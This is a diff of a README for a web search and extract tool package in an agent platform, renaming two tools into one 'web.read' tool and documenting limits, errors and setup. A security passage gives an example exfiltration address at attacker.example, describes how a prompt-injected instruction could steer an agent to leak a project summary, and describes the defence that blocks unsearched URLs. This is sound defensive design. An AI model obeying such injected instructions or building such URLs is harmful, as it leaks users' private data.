@@ -1,5 +1,9 @@
 # Web
 
+Personal-agent tools below use `{"action":"x","x":{...}}`.
+Leased workers keep the alias names and inputs granted by their pinned workflows.
+See the [tool overview](../../README.md#agent-tools).
+
 Web gives every agent internet search, as Nisa's agents search: Tavily first,
 and OpenAI's hosted web search when Tavily cannot serve. It is a port of Nisa's
 `web_search` and `web_extract` (`project/backend/agents/tools/web_search.py`):
@@ -7,10 +11,10 @@ the same inputs, the same fix-ups reported in `normalization_note`, the same
 caps and the same fallback triggers. It is optional and dormant: the deployment
 composes it only where a key is configured (see [Turning it on](#turning-it-on)).
 
-| Entrypoint        | Requires   | Provides                                                 |
-| ----------------- | ---------- | -------------------------------------------------------- |
-| `@merv/web`       | nothing    | `web` service                                            |
-| `@merv/web/tools` | Web, Tools | `web.search`, and `web.extract` where Tavily has its key |
+| Entrypoint        | Requires   | Provides                                                                   |
+| ----------------- | ---------- | -------------------------------------------------------------------------- |
+| `@merv/web`       | nothing    | `web` service                                                              |
+| `@merv/web/tools` | Web, Tools | `web.read` (`search`), and `web.read` (`extract`) where Tavily has its key |
 
 ## Where it sits
 
@@ -47,16 +51,15 @@ through Tavily.
 
 ## Tools
 
-Both tools are reads (`readOnly`) of another service (`openWorld`): the
+Both actions of `web.read` are reads (`readOnly`) of another service (`openWorld`): the
 registry runs them without holding a PostgreSQL snapshot while the provider
 answers, and checks the caller again before handing back the result. They name
 no `conversation` use, so:
 
-- **Pi** offers them to every turn, a reader's too, as `web_search` and
-  `web_extract`, and runs them as the person. A
-  conversation's `web.extract` reads only a page one of that conversation's
+- **Pi** offers `web.read` to every turn, a reader's too, and runs it as the person. A
+  conversation's `web.read` (`extract`) reads only a page one of that conversation's
   own searches returned (see [Reading pages](#reading-pages));
-- **leased workers** may call them as open reads their policy never names, but
+- **leased workers** keep `web.search` and `web.extract` as open reads, but
   the runner offers them only to a worker whose shell already has the network:
   Claude workers through `mcp__merv`, except a sealed review, which is launched
   with them disallowed; Codex workers on a hosted, unsealed launch, whose
@@ -69,7 +72,7 @@ tell the model to cite what it uses as Markdown links, to treat web text as
 untrusted source material, to use a literature search tool for papers, and that
 what it sends leaves Merv (see [Privacy](#privacy)).
 
-`web.search { query, max_results?, search_depth?, topic?, time_range? }`
+`web.read { action: "search", search: { query, max_results?, search_depth?, topic?, time_range? } }`
 
 - `query` is a string of at most 400 characters, or a list of up to 4, each
   run as its own search in parallel and counted as its own call against the
@@ -101,7 +104,7 @@ result_count }`, with `normalization_note`, and `content_truncated` with
   sources, with empty content and scores of 1/(i+1). Nisa also copies the answer
   into the first result; Web does not, so the answer is counted once.
 
-`web.extract { url, extract_depth?, start_text?, end_text?, offset? }`
+`web.read { action: "extract", extract: { url, extract_depth?, start_text?, end_text?, offset? } }`
 
 - Tavily reads the page. Merv never fetches it: Main sits on a network with
   services no caller may address, so a direct fetch would be a request forgery
@@ -133,11 +136,11 @@ result_count }`, with `normalization_note`, and `content_truncated` with
 
 An address is a request to whoever serves it, and anything an agent has read
 (a project record, a feed item, a search excerpt carrying an injected
-instruction) can be written into one: `web.extract` on
+instruction) can be written into one: `web.read` (`extract`) on
 `https://attacker.example/?d=<the project summary>` would put that summary in
 the attacker's access log. No one checks a conversation's read before it runs, so
-from a conversation `web.extract` reads only an address that one of the same
-conversation's `web.search` answers returned (its fragment ignored), and
+from a conversation `web.read` (`extract`) reads only an address that one of the same
+conversation's `web.read` (`search`) answers returned (its fragment ignored), and
 refuses anything else with `web_address_unsearched` before any request, charged
 nothing. The model is told to search for a page first, or to ask the person to
 open it. The memory is per process (the last 500 addresses of the last 1,000
@@ -175,7 +178,7 @@ never what a provider wrote:
 | `web_budget_exhausted`                                                 | 429    | A day's calls are made: the project's, the deployment's, or its fallback searches |
 | `web_busy`                                                             | 429    | Every slot stayed taken for the 15 s a call waits                                 |
 | `web_rate_limited`                                                     | 429    | A provider's rate limit held through its retries                                  |
-| `web_unavailable`                                                      | 503    | No provider has a key (for `web.extract`: Tavily has none)                        |
+| `web_unavailable`                                                      | 503    | No provider has a key (for `web.read` (`extract`): Tavily has none)               |
 | `web_provider_refused`, `web_quota_exhausted`                          | 503    | Tavily refused its key or its plan, with no fallback                              |
 | `web_request_refused`                                                  | 422    | Tavily refused the request itself (HTTP 400)                                      |
 | `web_address_unsearched`                                               | 422    | A conversation asked for a page none of its searches returned                     |
@@ -309,7 +312,7 @@ this package: an older image's render ignores these variables. So:
 
 4. Check that the ready line lists the plugins, and that the tools answer:
    `sudo docker logs merv-typescript-control-1 2>&1 | grep '"status":"ready"' | tail -n1`
-   should name `web` and `web-tools` as active; `web.search` should then appear
+   should name `web` and `web-tools` as active; `web.read` (`search`) should then appear
    in a project's MCP tool list, and in a new Pi turn.
 
 To turn it off, remove the variables and recreate Main the same way. Hosted
